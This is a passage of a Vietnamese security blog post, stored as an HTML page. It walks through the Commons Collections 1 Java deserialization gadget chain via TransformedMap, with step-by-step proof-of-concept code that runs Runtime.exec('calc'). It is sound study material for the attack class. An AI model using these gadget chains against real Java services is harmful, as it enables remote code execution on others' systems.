@@ -1,0 +1,632 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+  <!-- 元数据 -->
+  <meta charset="utf-8">
+  <link rel="icon" href="https://i.pinimg.com/564x/07/87/e7/0787e75ed249720cdb85f6918c609f61.jpg">
+  
+  <title>Phân tích chuỗi Commons Collections 1 với TransformedMap | Rayinaw</title>
+  <meta name="author" content="Rayinaw" />
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="robots" content="index,follow" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <meta name="format-detection" content="telphone=no, email=no" />
+  
+    <meta name="keywords" content="Java, Deserialization, Commons Collections" />
+  
+  <meta name="description" content="Một vài khái niệm cần nắmTrước tiên chúng ta cần hình dung lớp Runtime sẽ exec câu lệnh như nào, ở đây mình có sử dụng kiến thức reflection mà mình đã có bài viết về nó, các bạn có thể tham khảo thêm.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Phân tích chuỗi Commons Collections 1 với TransformedMap">
+<meta property="og:url" content="https://rayinaw.github.io/2022/11/04/Commons-Collections1-TransformedMap/index.html">
+<meta property="og:site_name" content="Rayinaw">
+<meta property="og:description" content="Một vài khái niệm cần nắmTrước tiên chúng ta cần hình dung lớp Runtime sẽ exec câu lệnh như nào, ở đây mình có sử dụng kiến thức reflection mà mình đã có bài viết về nó, các bạn có thể tham khảo thêm.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.pinimg.com/564x/07/87/e7/0787e75ed249720cdb85f6918c609f61.jpg">
+<meta property="article:published_time" content="2022-11-04T11:00:38.000Z">
+<meta property="article:modified_time" content="2022-12-14T20:31:49.395Z">
+<meta property="article:author" content="Rayinaw">
+<meta property="article:tag" content="Java, Deserialization, Commons Collections">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.pinimg.com/564x/07/87/e7/0787e75ed249720cdb85f6918c609f61.jpg">
+  
+  <!-- 站点验证相关 -->
+  
+    
+    
+    
+  
+  <!-- 样式表文件 -->
+  <link rel="stylesheet" id="kratos-css" href="/css/kratosr.min.css" media="all"></script>
+  
+    <link rel="stylesheet" id="darkmode-css" href="/css/kr-color-dark.min.css" media="(prefers-color-scheme: dark)"></script>
+    <script src="/js/kr-dark.min.js"></script>
+  
+  
+    <link rel="stylesheet" id="highlight-css" href="/css/highlight/night.min.css" media="all"></script>
+  
+  
+  <link rel="stylesheet" id="fontawe-css" href="/vendors/font-awesome@4.7.0/css/font-awesome.min.css" media="all"></script>
+  <link rel="stylesheet" id="nprogress-css" href="/vendors/nprogress@0.2.0/nprogress.css" media="all"></script>
+  
+  
+    <link rel="stylesheet" href="/vendors/aplayer@1.10.1/dist/APlayer.min.css"></script>
+  
+  
+    <link rel="stylesheet" href="/vendors/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"></script>
+  
+  <!-- 不得不预先加载的一些JS文件 -->
+  <script src="/vendors/jquery@3.6.0/dist/jquery.min.js"></script>
+  
+    <script src="/vendors/qrcode_js@1.0.0/qrcode.min.js"></script>
+  
+  
+  <style>
+    
+      .kratos-cover.kratos-cover-2 {
+        background-image: url('/images/banner.webp');
+      }
+    
+    
+      @media(min-width:768px) {
+        body.custom-background {
+          background-image: url('/images/bg.webp');
+        }
+      }
+    
+  </style>
+  
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Rayinaw" type="application/atom+xml">
+</head>
+
+
+    <body class="custom-background">
+        <div id="kratos-wrapper">
+    <div id="kratos-page">
+        <div id="kratos-header">
+            <header id="kratos-desktop-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="nav-header">
+                        <nav id="kratos-menu-wrap">
+                            <ul id="kratos-primary-menu" class="sf-menu">
+                                
+                                    
+                                    
+                                        
+                                            <li><a href="/"><i class="fa fa-home"></i>Trang chủ</a></li>
+                                        
+                                    
+                                        
+                                            <li><a href="/archives/"><i class="fa fa-book"></i>Kho lưu trữ</a></li>
+                                        
+                                    
+                                        
+                                            <li><a href="/about/"><i class="fa fa-paper-plane"></i>Về mình</a></li>
+                                        
+                                    
+                                
+                            </ul>
+                        </nav>
+                    </div>
+                </div>
+            </header>
+            <header id="kratos-mobile-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="color-logo"><a href="/">Rayinaw</a></div>
+                    <div class="nav-toggle">
+                        <a class="kratos-nav-toggle js-kratos-nav-toggle">
+                            <i></i>
+                        </a>
+                    </div>
+                </div>
+            </header>
+        </div>
+        <div class="kratos-start kratos-hero-2">
+            <!-- <div class="kratos-overlay"></div> -->
+            <div class="kratos-cover kratos-cover-2 text-center">
+                <div class="desc desc2 animate-box">
+                    <a href="/">
+                        <h2>Rayinaw</h2> <br />
+                        <span>Nơi mình ghi chú lại những thứ đã học.</span>
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <div id="kratos-blog-post">
+            <div class="container">
+                <div id="main" class="row">
+                    
+
+        
+
+            <section class="col-md-8">
+
+        
+
+            <article itemscope itemtype="https://schema.org/Article">
+    
+    <link itemprop="mainEntityOfPage" href="https://rayinaw.github.io/2022/11/04/Commons-Collections1-TransformedMap/">
+    <div class="kratos-hentry kratos-post-inner clearfix">
+        <header class="kratos-entry-header">
+            
+                <h1 class="kratos-entry-title text-center" itemprop="name headline">Phân tích chuỗi Commons Collections 1 với TransformedMap</h1>
+            
+            
+            <ul class="kratos-post-meta text-center">
+                <li><time datetime="2022-11-04T11:00:38.000Z" itemprop="datePublished"><i class="fa fa-calendar"></i> 2022-11-04</time></li>
+                <li itemprop="author" itemscope itemtype="https://schema.org/Person">
+                    <i class="fa fa-user"></i> Tác giả <span itemprop="name">Rayinaw</span>
+                </li>
+                <li>
+                    <i class="fa fa-edit"></i> 
+                    
+                    
+                        ~28.14K
+                    
+                    từ
+                </li>
+                
+            </ul>
+        </header>
+        <div class="kratos-post-content">
+            
+            <div id="expire-alert" class="alert alert-warning hidden" role="alert">
+                <div class="icon"><i class="fa fa-warning"></i></div>
+                <div class="text"><p>Bài viết này được chỉnh sửa lần cuối vào <time datetime="1671049909395"></time> trước, và có thể cần cập nhật。</p></div>
+            </div>
+            
+            
+            
+            <hr />
+            <div itemprop="articleBody"><h2 id="Mot-vai-khai-niem-can-nam"><a href="#Mot-vai-khai-niem-can-nam" class="headerlink" title="Một vài khái niệm cần nắm"></a>Một vài khái niệm cần nắm</h2><p>Trước tiên chúng ta cần hình dung lớp Runtime sẽ exec câu lệnh như nào, ở đây mình có sử dụng kiến thức reflection mà mình đã có bài viết về nó, các bạn có thể tham khảo thêm.</p>
+<ul>
+<li>Lớp java.lang.reflect.Method có phương thức invoke, nó dùng để invoke method của object được truyền vào ở tham số đầu tiên, và với các tham số của method này là Object args (tham số lưu dưới dạng object).<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object obj, Object... args)</span>  <span class="keyword">throws</span> IllegalAccessException,  </span><br><span class="line">               IllegalArgumentException,  </span><br><span class="line">                InvocationTargetException  </span><br></pre></td></tr></table></figure></li>
+<li>Trong lớp Runtime có phương thức exec dùng để exec câu lệnh trên system.</li>
+<li>Bây giờ mình sẽ thực hiện invoke method exec của lớp runtime, vì nó là method private nên để sử dụng chúng ta cần setAccessible(“true”).<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">runtime</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">execMethod</span> <span class="operator">=</span> Runtime.class.getDeclaredMethod(<span class="string">&quot;exec&quot;</span>,  String.class);</span><br><span class="line">        execMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        execMethod.invoke(runtime, <span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="Phan-tich"><a href="#Phan-tich" class="headerlink" title="Phân tích"></a>Phân tích</h2><p>Sơ đồ tóm tắt chuỗi</p>
+<h3 id="InvokerTransformer-transform"><a href="#InvokerTransformer-transform" class="headerlink" title="InvokerTransformer.transform"></a>InvokerTransformer.transform</h3><p>Chain này bắt đầu từ lớp InvokerTransformer. Lớp này implements interface Transformer.</p>
+<p>Hàm tạo của lớp InvokerTransformer:</p>
+<p><img src="/.io//InvokerTransformerConstructor.png" alt="alt"></p>
+<ul>
+<li><code>Object[] args</code> ở đây nhận một Object với kiểu String.</li>
+<li><code>Class[] paramTypes</code> nhận một Object của lớp Class</li>
+</ul>
+<p>Trong trường structure tìm đến method transform trong class InvokerTransformer ta thấy:</p>
+<p><img src="/.io//InvokerTransformerTransform.png" alt="alt"></p>
+<ul>
+<li>Đầu tiên, nó thực hiện lấy class của object input là tham số của phương thức transform.</li>
+<li>Tiếp theo nó thực hiện lấy phương thức với tên phương thức là tham số iMethodName của object của lớp InvokerTransformer, và iParamTypes là lớp đại diện cho kiểu tham số của phương thức này rồi gán vào object method có kiểu là Method.<br>Sau đó nó thực hiện invoke method là iMethodName của của object input với tham số là iArgs.</li>
+</ul>
+<p>Có nghĩa khi chúng ta thực hiện <code>invoker.transform(object)</code> nó sẽ tương đương với việc chúng ta thực hiện invoke() method chứa trong biến invoker của object. Vậy nên ở đây chúng ta có thể sử dụng lớp InvokerTransformer để thực hiện lệnh exec của lớp Runtime.</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        String[] cmd = <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;calc&quot;</span>&#125;;</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, cmd);</span><br><span class="line">        invokerTransformer.transform(Runtime.getRuntime());</span><br><span class="line">        <span class="comment">//Runtime.getRuntime() trả về một object của lớp Runtime</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Tiếp theo chúng ta cần tìm lớp nào gọi đến phương thức transform của lớp InvokerTransformer.</p>
+<p><code>Ctrl + Chuột trái</code> click vào phương thức transform:</p>
+<p><img src="/.io//ClassesCallMethodTransform.png" alt="alt"></p>
+<p>Phương thức này có nhiều lớp gọi đến, nhưng để có ảnh hưởng lead to CC1 chỉ có 2 lớp là TranformedMap và LazyMap. Bài viết này mình sẽ phân tích theo hướng TranformedMap. LazyMap mình sẽ phân tích sau. Cùng phân tích thôi nào~</p>
+<h3 id="TransformedMap-checkSetValue"><a href="#TransformedMap-checkSetValue" class="headerlink" title="TransformedMap.checkSetValue"></a>TransformedMap.checkSetValue</h3><p>Hàm này có 3 phương thức gọi đến method transform là <code>checkSetValue</code>, <code>transformValue</code> và <code>transformKey</code>. Tuy nhiên phương thức chúng ta cần đi vào là <code>checkSetValue</code> bởi vì nó được sử dụng ở những lớp khác và kéo theo một chuỗi gadget.</p>
+<p>Phương thức checkSetValue:</p>
+<p><img src="/.io//TransformedMap-checkSetValue.png" alt="alt"></p>
+<p>Nhìn vào phương thức này chúng ta thấy khá tương đồng với đoạn code ngắn để exec calc với lớp InvokerTranformer rồi phải không.</p>
+<p>Bây giờ chúng ta sẽ xem valueTransformer là gì:</p>
+<p><img src="/.io//TransformedMap-Constructor.png" alt="alt"></p>
+<p>valueTransformer là một object của lớp Transformer.</p>
+<p>Hàm tạo này khai báo protected nên không thể tạo trực tiếp, chúng ta cần tìm phương thức trả về object của lớp này.</p>
+<p>Trong lớp này có phương thức decorate return một object của TransformedMap, các tham số đầu vào tương ứng với các tham số của hàm tạo TransformedMap. Chúng ta sẽ dùng phương thức này để tạo gián tiếp một object của lớp TransformedMap.</p>
+<p><img src="/.io//TransformedMap-decorate-png.png" alt="alt"></p>
+<p>valueTransformer là một object kiểu Transformer nên chúng ta có thể truyền vào một object kiểu InvokerTransformer vì thằng này implements Transformer. Phương thức checkSetValue là phương thức protected nên chúng ta cần dùng reflection để gọi đến phương thức này. </p>
+<p>Chuỗi poc ngắn từ TranformedMap:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">runtime</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        String[] argsRuntime = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;;</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, argsRuntime);</span><br><span class="line">        <span class="type">TransformedMap</span> <span class="variable">transformedMap</span> <span class="operator">=</span> (TransformedMap) TransformedMap.decorate(map, <span class="literal">null</span>, invokerTransformer);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> TransformedMap.class.getDeclaredMethod(<span class="string">&quot;checkSetValue&quot;</span>, Object.class);</span><br><span class="line">        method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        method.invoke(transformedMap, Runtime.getRuntime());</span><br><span class="line">        <span class="comment">//tham số của checkSetValue sẽ được truyền bào phương thức transform nên chúng ta sẽ truyền vào Runtime.getRuntime() tương tự như invokerTransformer.transform(Runtime.getRuntime());</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Đây chỉ là một POC nhỏ, chỉ để chỉ ra rằng lớp TransformedMap có thể kích hoạt được phương thức của lớp Runtime. Vấn đề của chúng ta bây giờ là cần tìm ai gọi đến method checkSetValue này.</p>
+<h3 id="AbstractMapEntryDecorator-MapEntry"><a href="#AbstractMapEntryDecorator-MapEntry" class="headerlink" title="AbstractMapEntryDecorator.MapEntry"></a>AbstractMapEntryDecorator.MapEntry</h3><p>Tiếp tục <code>Ctrl + chuột trái</code> click vào checkSetValue, ta thấy phương thức AbstractMapEntryDecorator.MapEntry.setValue() gọi đến checkSetValue.</p>
+<ul>
+<li>Lớp AbstractMapEntryDecorator là abstract cha của lớp TransformedMap.</li>
+<li>setValue là phương thức của lớp Map.Entry.</li>
+</ul>
+<p><img src="/.io//AbstractInputCheckedMapDecorator-entry-setValue.png" alt="alt"></p>
+<p>Trước tiên chúng ta cần hiểu entry là gì à cách nó được sử dụng trong Map. Các bạn có thể tham khảo ở <a target="_blank" rel="noopener" href="https://viblo.asia/p/cac-cach-iterate-map-trong-java-ORNZqjNMl0n">đây</a>.</p>
+<p>Hàm setValue() sẽ thực hiện gán giá trị vào key. Với thư viện map, khi truy cập từng cặp khóa-giá trị (entry) này chúng ta sẽ dùng cách duyệt qua từng entry rồi thao tác với từng entry đó. </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testMapIterator</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        HashMap&lt;String,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;key1&quot;</span>, <span class="string">&quot;value1&quot;</span>);</span><br><span class="line">        hashMap.put(<span class="string">&quot;key2&quot;</span>, <span class="string">&quot;value2&quot;</span>);</span><br><span class="line">        hashMap.put(<span class="string">&quot;key3&quot;</span>, <span class="string">&quot;value3&quot;</span>);</span><br><span class="line">        Set&lt;Map.Entry&lt;String, Object&gt;&gt; set = hashMap.entrySet();</span><br><span class="line">        System.out.println(<span class="string">&quot;Results: &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(Map.Entry&lt;String, Object&gt; entry : set) &#123;</span><br><span class="line">            entry.setValue(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(hashMap);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//Results: </span></span><br><span class="line">    <span class="comment">//&#123;key1=aaa, key2=aaa, key3=aaa&#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Theo dõi hàm setValue:</p>
+<p><img src="/.io//override-setValue-1.png" alt="alt"></p>
+<p><img src="/.io//override-setValue-2.png" alt="alt"></p>
+<p><img src="/.io//override-setValue-3.png" alt="alt"></p>
+<p>Phương thức setValue của interface <code>java.util.Map</code> được implements bởi lớp <code>AbstractMapEntryDecorator</code>, tiếp đến phương thức setValue của lớp này được Override bởi phương thức setValue của lớp <code>AbstractInputCheckedMapDecorator.MapEntry</code>.</p>
+<p>Khi duyệt map của lớp bằng <code>AbstractInputCheckedMapDecorator.EntrySetIterator</code>, phương thức next() return ra một <code>AbstractInputCheckedMapDecorator.MapEntry</code>.<br>Do đó chúng ta có thể gọi đến hàm setValue() của <code>AbstractInputCheckedMapDecorator.MapEntry</code>.</p>
+<p>Lớp transformedMap implements lớp <code>AbstractInputCheckedMapDecorator</code>, do đó khi chúng ta decorate một map thành transformedMap và duyệt map bằng entrySet() kết hợp với iterator rồi thực hiện hàm setValue() của transformedMap, nó sẽ thực hiện hàm setValue của lớp <code>AbstractInputCheckedMapDecorator.MapEntry</code>, phương thức này sẽ gọi đến hàm checkSetValue(). Bạn nào mới học mà không hiểu thì đoạn <code>Map.Entry entry : map.entrySet()</code> là làm tắt bỏ bước define Iterator tuy nhiên nó cũng iterator bên trong đó nhé. </p>
+<p>Tiếp tục viết poc từ phương thức này:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        String[] cmd = <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;calc&quot;</span>&#125;;</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, cmd);</span><br><span class="line">        Map&lt;Object, Object&gt; map = (TransformedMap) TransformedMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(), <span class="literal">null</span>, invokerTransformer);</span><br><span class="line">        map.put(<span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">for</span>(Map.Entry entry : map.entrySet())&#123;</span><br><span class="line">            entry.setValue(Runtime.getRuntime());<span class="comment">//nếu bạn không hiểu dòng này thì nhìn lại hàm checkSetValue và POC trên kia.</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Nó đã kích hoạt được lệnh exec của lớp Runtime. Bây giờ chúng ta sẽ tìm xem có phương thức readObject nào gọi phương thức setValue này không. Click chuột phải vào hàm setValue và chọn Find Usage. Ở đây mình không thể tìm được lớp nào bởi vì mình chưa decompile trực tiếp các file trong jdk8u65, khá nhiều thứ để làm nên thôi mình sẽ tiếp tục làm theo sơ đồ của người ta.</p>
+<h3 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h3><p><code>Ctrl + N</code> để tìm lớp AnnotationInvocationHandler, trong phương thức readObject của lớp này, chúng ta thấy có phương thức setValue được gọi.<br>Hàm tạo của lớp AnnotationInvocationHandler:</p>
+<p><img src="/.io//AnnotationInvocationHandler.png" alt="alt"></p>
+<p>Hàm readObject của lớp AnnotationInvocationHandler:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        var1.defaultReadObject();</span><br><span class="line">        <span class="type">AnnotationType</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var2 = AnnotationType.getInstance(<span class="built_in">this</span>.type);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">var3</span> <span class="operator">=</span> var2.memberTypes();</span><br><span class="line">        <span class="type">Iterator</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">            Map.<span class="type">Entry</span> <span class="variable">var5</span> <span class="operator">=</span> (Map.Entry)var4.next();</span><br><span class="line">            <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> (String)var5.getKey();</span><br><span class="line">            <span class="type">Class</span> <span class="variable">var7</span> <span class="operator">=</span> (Class)var3.get(var6);</span><br><span class="line">            <span class="keyword">if</span> (var7 != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">var8</span> <span class="operator">=</span> var5.getValue();</span><br><span class="line">                <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    var5.setValue((<span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(var8.getClass() + <span class="string">&quot;[&quot;</span> + var8 + <span class="string">&quot;]&quot;</span>)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>Lớp AnnotationInvocationHandler có phạm vi default, nên chúng ta cần lấy lớp này và hàm tạo của nó thông qua reflection, sau đó khởi tạo nó. (stuck cũng lâu phết hic)</p>
+<ul>
+<li>Constructor của lớp Non-public phải lấy bằng phương thức getDeclaredConstructor().</li>
+<li>Tham số thứ nhất của hàm tạo là một lớp, tham số thứ hai là một map.</li>
+</ul>
+<p>Một đoạn code nhỏ để test thử việc khởi tạo lớp AnnotationInvocationHandler:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testTransformedMap</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span 